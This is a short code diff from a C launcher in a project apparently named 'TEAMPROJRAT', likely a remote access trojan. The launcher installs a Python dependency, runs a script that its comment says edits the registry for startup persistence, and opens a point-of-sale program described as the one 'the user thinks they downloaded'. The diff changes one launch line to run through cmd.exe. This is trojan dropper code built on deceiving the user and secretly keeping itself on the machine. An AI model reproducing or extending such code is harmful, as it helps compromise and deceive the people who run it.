@@ -19,6 +19,6 @@ int main()
     system("start /WAIT pip install openpyxl\n"); //openpyxl is needed to run pos.py
     system("python .\\persistence\\add_startup.py\n"); //starts the registry editing py file after python is installed
     system(".\\UDP_Connection\\pos.pyw\n"); //starts the POS the user thinks they downloaded
-    system("C:\\Users\\IEUser\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\pos.pyw");
+    system("cmd.exe C:\\Users\\IEUser\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\pos.pyw");
     return 0;
 }
